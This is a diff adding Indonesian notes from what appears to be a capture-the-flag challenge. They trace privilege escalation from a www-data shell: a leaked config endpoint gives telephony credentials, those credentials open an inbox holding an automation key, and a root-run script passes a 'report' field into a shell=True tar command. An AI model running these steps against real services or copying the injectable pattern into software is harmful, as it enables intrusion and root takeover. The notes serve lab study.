@@ -1,0 +1,32 @@
+Enumerasi dari shell www-data (script /out/c).
+
+# Watchtower — /api/config membocorkan kredensial UCP
+$ curl -sS http://127.0.0.1:3000/api/config
+{
+  "telephony_user": "ucp-template",
+  "telephony_pass": "Pr0gr3ssB4r_2026",
+  ... field lain tidak dicatat ...
+}
+
+# Telephony UCP — login, tambah widget voicemail, buka inbox
+$ curl -sS -c /tmp/jar -b /tmp/jar \
+    -d 'username=ucp-template&password=Pr0gr3ssB4r_2026' \
+    http://127.0.0.1:8080/ucp/login
+$ curl -sS -c /tmp/jar -b /tmp/jar -d 'widget=voicemail' \
+    http://127.0.0.1:8080/ucp/widgets
+$ curl -sS -c /tmp/jar -b /tmp/jar http://127.0.0.1:8080/ucp/inbox
+
+# Inbox berisi automation key:
+PB_AUTO_7b3f9a1c4e0d2f6a
+
+# Automation — berjalan sebagai root
+# /opt/automation/app.py:
+command = f"tar czf {EXPORT_DIR}/{report}.tgz {DATA_DIR} 2>&1"
+subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20)
+
+# /usr/local/sbin/challenge-entrypoint:
+python3 -u /opt/automation/app.py &
+start_as svc-watch python3 -u /opt/watchtower/app.py
+start_as svc-telephony python3 -u /opt/telephony/app.py
+
+# Artinya: field "report" masuk ke shell=True sebagai root.
